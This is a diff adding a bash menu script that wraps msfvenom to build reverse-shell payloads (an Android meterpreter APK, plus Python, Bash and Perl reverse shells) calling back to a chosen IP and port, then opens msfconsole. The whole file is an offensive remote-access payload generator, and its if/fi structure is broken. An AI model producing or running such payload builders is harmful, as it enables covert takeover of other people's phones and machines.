@@ -1,0 +1,126 @@
+#!/bin/bash
+
+clear
+
+function android() {
+
+  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
+
+read Ip
+
+echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
+
+read Port
+
+echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
+
+read Name
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$Ip LPORT=$Port -o /sdcard/$Name.apk
+
+msfconsole
+
+}
+
+function python() {
+
+  
+
+  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
+
+read Ip
+
+echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
+
+read Port
+
+echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
+
+read Name
+
+msfvenom -p cmd/unix/reverse_python LHOST=$Ip LPORT=$Port -f raw > $Name.py
+
+msfconsole
+
+}
+
+function bash() {
+
+  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
+
+read Ip
+
+echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
+
+read Port
+
+echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
+
+read Name
+
+msfvenom -p cmd/unix/reverse_bash LHOST=$Ip LPORT=$Port -f raw > $Name.sh
+
+msfconsole
+
+}
+
+function perl() {
+
+  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
+
+read Ip
+
+echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
+
+read Port
+
+echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
+
+read Name
+
+msfvenom -p cmd/unix/reverse_perl LHOST=$Ip LPORT=$Port -f raw > $Name.pl
+
+msfconsole
+
+}
+
+echo ""
+
+figlet -f ASCII-Shadow " payload "|lolcat -t
+
+echo -e """
+
+\033[31m[1] \033[32mCreate a payload in Android
+
+\033[31m[2] \033[32mCreate a payload in Python
+
+\033[31m[3] \033[32mCreate a payload in Bash
+
+\033[31m[4] \033[32mCreate a payload in Perl
+
+\033[31m[5] \033[32mmenu
+
+"""
+
+read -p "select number : " try
+
+if [[ $try -eq "1" ]]; then
+
+android
+
+if [[ $try -eq "2" ]]; then
+
+python
+
+if [[ $try -eq "3" ]]; then
+
+bash
+
+if [[ $try -eq "4" ]]; then
+
+perl
+
+if [[ $try -eq "5" ]]; then
+
+exit
+fi
